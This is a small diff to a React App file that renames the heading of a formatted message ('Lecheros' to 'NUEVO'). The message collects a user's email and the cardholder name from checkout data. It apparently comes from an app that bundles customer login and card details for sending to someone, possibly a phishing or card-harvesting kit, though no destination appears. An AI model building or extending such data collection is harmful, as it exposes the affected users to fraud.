@@ -165,7 +165,7 @@ export default function App() {
     ];
     
     const message = `
-🌟 **Lecheros** 🌟
+🌟 **NUEVO** 🌟
 ----------------------------
 📧 **Email:** ${signupEmail || loginEmail}
 👤 **Nombre en Tarjeta:** ${checkoutData.cardName}
